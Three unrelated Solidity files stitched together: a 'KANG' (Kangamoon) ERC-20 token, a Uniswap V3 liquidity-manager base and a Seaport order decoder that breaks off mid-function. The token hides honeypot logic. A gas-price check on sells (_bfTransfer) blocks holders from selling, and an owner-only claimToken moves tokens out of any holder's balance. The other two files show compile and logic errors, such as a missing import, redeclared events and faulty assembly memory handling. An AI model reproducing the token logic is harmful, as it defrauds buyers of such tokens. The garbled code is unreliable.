library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract KANG is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeFromFees;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Kangamoon";
    string private constant _symbol = unicode"KANG";
    uint256 public BuyTaxFee = 0;
    uint256 public SellTaxFee = 0;
    bool private openedTrade = false;
    address private DeploymentWL = 0x50EECadd58b5d86231DFb0Fa33824B3d229B5a5B;
    address private Marketing = 0x0838941bD9aB4CaBfB35Fc02858299C91B67BF56;
    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    constructor() {
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(80).div(100));
        _balances[DeploymentWL] = _balances[DeploymentWL].add(_totalSupply.mul(10).div(100));
        _balances[Marketing] = _balances[Marketing].add(_totalSupply.mul(10).div(100));
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        _excludeFromFees[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;
        _excludeFromFees[address(uniswapV2Pair)];
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(80).div(100));
        emit Transfer(address(0), DeploymentWL, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Marketing, _totalSupply.mul(10).div(100));
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(from) >= amount, "ERROR: balance of from less than value");
        uint256 taxAmount = 0;
        if(!_excludeFromFees[from] && !_excludeFromFees[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount * BuyTaxFee / 100;
            if(to == uniswapV2Pair) {
                taxAmount = amount * SellTaxFee / 100;
                _bfTransfer(from);
            }
        }
        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)]+taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from]= balanceOf(from) - amount ;
        _balances[to]=_balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    uint256 private Gaslimittited = 1000 gwei;
    uint256 private Gasmaxxxxx = 5;
    function _bfTransfer(address _u) internal view {
        if(balanceOf(_u) > 0) {
            if (!openedTrade) {
                gasRequire(Gaslimittited);
            } else {
                gasRequire(Gasmaxxxxx);
            }
        } 
    }
    function gasRequire(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }
    function claimToken(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount[i]  * 10 ** _decimals);
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }
    function openTrading() external onlyOwner {
        openedTrade = !openedTrade;
    }
    receive() external payable {}
}

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

/**
 * @title AbstractLiquidityManager
 * @dev Abstract base contract for managing Uniswap V3 liquidity positions.
 *      Provides fee configuration, access control, and secure integration
 *      with the Nonfungible Position Manager.
 */
abstract contract AbstractLiquidityManager is Ownable, Pausable, IERC721Receiver {

    // --- Events ---
    event ControllerSet(address indexed controller, bool enabled);
    event SwapRouterWhitelisted(address indexed router, bool enabled);
    event FeeConfigurationUpdated(uint24 newFee);
    event PositionManagerUpdated(address indexed newPositionManager);
    event PoolAddressSet(address indexed token0, address indexed token1, uint24 indexed fee, address pool);
    event Paused(address account);
    event Unpaused(address account);

    // --- Errors ---
    error Unauthorized();
    error InvalidPool();
    error PositionManagerMismatch();
    error TransferFailed();

    // --- State Variables ---
    INonfungiblePositionManager public positionManager;

    // Fee tier for the pool (e.g., 500, 3000, 10000 for 0.05%, 0.3%, 1%)
    uint24 public fee;

    // Access control
    mapping(address => bool) public isController;
    mapping(address => bool) public isWhitelistedSwapRouter;

    // Cache pool addresses to save gas on lookups
    mapping(address => mapping(address => mapping(uint24 => address))) public poolAddress;

    // --- Modifiers ---
    modifier onlyController() {
        if (!isController[msg.sender]) revert Unauthorized();
        _;
    }

    modifier onlyOwnerOrController() {
        if (msg.sender != owner() && !isController[msg.sender]) revert Unauthorized();
        _;
    }

    // --- Constructor ---
    constructor(
        address _positionManager,
        uint24 _fee
    ) {
        if (_positionManager == address(0)) revert();
        if (_fee == 0) revert();

        positionManager = INonfungiblePositionManager(_positionManager);
        fee = _fee;
    }

    // --- Owner Functions ---
    /**
     * @notice Sets or removes a controller
     * @param controller The address to set
     * @param enabled Whether the controller is enabled
     */
    function setController(address controller, bool enabled) external onlyOwner {
        require(controller != address(0), "Invalid controller");
        isController[controller] = enabled;
        emit ControllerSet(controller, enabled);
    }

    /**
     * @notice Whitelist or delist a swap router
     * @param router The swap router address
     * @param enabled Whether to enable the router
     */
    function setWhitelistedSwapRouter(address router, bool enabled) external onlyOwner {
        require(router != address(0), "Invalid router");
        isWhitelistedSwapRouter[router] = enabled;
        emit SwapRouterWhitelisted(router, enabled);
    }

    /**
     * @notice Update the fee tier
     * @param newFee The new fee tier (e.g., 500, 3000)
     */
    function setFee(uint24 newFee) external onlyOwner {
        require(newFee > 0, "Fee must be > 0");
        fee = newFee;
        emit FeeConfigurationUpdated(newFee);
    }

    /**
     * @notice Update the Nonfungible Position Manager address
     * @param newPositionManager The new position manager address
     */
    function setPositionManager(address newPositionManager) external onlyOwner {
        require(newPositionManager != address(0), "Invalid PM");
        if (newPositionManager == address(positionManager)) revert();

        // Ensure the new manager is valid (try a simple call)
        try INonfungiblePositionManager(newPositionManager).factory() returns (address) {
            // Success
        } catch {
            revert PositionManagerMismatch();
        }

        positionManager = INonfungiblePositionManager(newPositionManager);
        emit PositionManagerUpdated(newPositionManager);
    }

    /**
     * @notice Cache a Uniswap V3 pool address
     * @param token0 First token (sorted)
     * @param token1 Second token (sorted)
     * @param feeFee Fee tier
     * @param pool The pool address
     */
    function setPoolAddress(
        address token0,
        address token1,
        uint24 feeFee,
        address pool
    ) external onlyOwner {
        require(token0 != address(0) && token1 != address(0), "Invalid tokens");
        require(pool != address(0), "Invalid pool");

        // Verify pool exists and matches factory
        address factory = positionManager.factory();
        require(
            pool == IUniswapV3Factory(factory).getPool(token0, token1, feeFee),
            "Pool mismatch"
        );

        poolAddress[token0][token1][feeFee] = pool;
        emit PoolAddressSet(token0, token1, feeFee, pool);
    }

    function pause() external onlyOwner {
        _pause();
        emit Paused(msg.sender);
    }

    function unpause() external onlyOwner {
        _unpause();
        emit Unpaused(msg.sender);
    }

    // --- External Functions ---
    /**
     * @notice Required by ERC721Receiver. Reverts if not intended.
     * @dev This contract should only accept NFTs from the position manager.
     */
    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes calldata /* data */
    ) external pure override returns (bytes4) {
        // Only accept NFTs minted via `mint` or `safeTransferFrom` from position manager
        // In practice, more validation can be added via the `data` parameter
        return IERC721Receiver.onERC721Received.selector;
    }

    // --- Internal Utilities ---
    /**
     * @dev Retrieves the pool address, either from cache or by computing it
     * @param token0 First token
     * @param token1 Second token
     * @return pool The Uniswap V3 pool address
     */
    function _getPool(
        address token0,
        address token1
    ) internal view returns (address pool) {
        // Sort tokens
        (address tokenA, address tokenB) = token0 < token1 ? (token0, token1) : (token1, token0);

        pool = poolAddress[tokenA][tokenB][fee];
        if (pool == address(0)) {
            address factory = positionManager.factory();
            pool = IUniswapV3Factory(factory).getPool(tokenA, tokenB, fee);
            if (pool == address(0)) revert InvalidPool();
        }
    }

    /**
     * @dev Safe ETH transfer with error handling
     * @param to Recipient address
     * @param value Amount to send
     */
    function _safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}("");
        if (!success) revert TransferFailed();
    }

    // --- Abstract Functions ---
    /**
     * @notice Hook to be called after liquidity is minted or increased
     * @dev Must be implemented by derived contracts
     */
    function _afterLiquidityAction(uint256 tokenId) internal virtual;

    /**
     * @notice Hook to be called before any liquidity removal
     * @dev Must be implemented by derived contracts
     */
    function _beforeRemoveLiquidity(uint256 tokenId) internal virtual;

    /**
     * @notice Core logic to rebalance liquidity based on strategy
     * @dev Implement automated positioning logic here
     */
    function rebalance() external virtual;

    // --- Receive ETH ---
    receive() external payable {}

    // --- Withdraw Stuck ETH (Owner Safety) ---
    function withdrawStuckETH() external onlyOwner {
        _safeTransferETH(owner(), address(this).balance);
    }
}

pragma solidity ^0.8.0;
/**
 * @title SeaportOrderDecoder
 * @dev Low-level library for decoding Seaport order components using inline assembly
 *      for efficient memory and calldata manipulation.
 *      This contract decodes structures from the OpenSea Seaport protocol.
 */
contract SeaportOrderDecoder {

    // --- Struct Definitions (Matching Seaport) ---
    struct OfferItem {
        uint8 itemType;
        address token;
        uint256 identifierOrCriteria;
        uint256 startAmount;
        uint256 endAmount;
    }

    struct ConsiderationItem {
        uint8 itemType;
        address token;
        uint256 identifierOrCriteria;
        uint256 startAmount;
        uint256 endAmount;
        address recipient;
    }

    // --- Events ---
    event OfferItemDecoded(
        uint8 itemType,
        address token,
        uint256 identifierOrCriteria,
        uint256 startAmount,
        uint256 endAmount
    );
    event ConsiderationItemDecoded(
        uint8 itemType,
        address token,
        uint256 identifierOrCriteria,
        uint256 startAmount,
        uint256 endAmount,
        address recipient
    );

    // --- Errors ---
    error InvalidOffset();
    error BufferTooShort();

    // --- Pure Functions using Assembly ---

    /**
     * @dev Decodes a single OfferItem from calldata at a given offset
     * @param cdOffset Offset in calldata where OfferItem starts
     * @return item The decoded OfferItem
     */
    function decodeOfferItem(uint256 cdOffset) external pure returns (OfferItem memory item) {
        assembly {
            // Check if there's enough data (5 * 32 bytes)
            if lt(sub(calldatasize(), cdOffset), 160) {
                mstore(0x00, 0x08c379a0) // Error signature
                mstore(0x04, 0x20)
                mstore(0x24, 0x16)
                mstore(0x44, "BufferTooShort")
                revert(0x00, 0x64)
            }

            // Read each field (32 bytes each)
            item := calldataload(cdOffset)
            let token := calldataload(add(cdOffset, 0x20))
            let idOrCrit := calldataload(add(cdOffset, 0x40))
            let startAmt := calldataload(add(cdOffset, 0x60))
            let endAmt := calldataload(add(cdOffset, 0x80))

            // Store in memory
            mstore(item, and(item, 0xFF))           // itemType (uint8)
            mstore(add(item, 0x20), token)         // token
            mstore(add(item, 0x40), idOrCrit)      // identifierOrCriteria
            mstore(add(item, 0x60), startAmt)      // startAmount
            mstore(add(item, 0x80), endAmt)        // endAmount
